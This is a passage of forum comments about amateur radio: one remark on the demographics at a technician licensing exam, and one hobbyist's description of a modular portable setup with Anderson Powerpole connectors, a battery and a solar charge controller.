/r/amateurradio). But the ARRL doesn't promote them, you have to go looking for them yourself. reply havblue 8 hours agorootparentOn the \"old white dudes\" claim, I noticed something funny during my technician exam: most (all white men) had glasses, plaid shirts, and worked in engineering or tech fields. Crew cuts.

It seems almost \"obvious\" after getting it all together, but it took a lot of reading and planning (and trying out setups) to settle on this configuration.

The upside is because it's kinda \"modular\" (thanks to Anderson Powerpole) I could attach a much larger battery, and its life is easily extended with the panel I have and charge controller. I haven't actually gone out in the field yet with the solar panel, only used at home, but still!
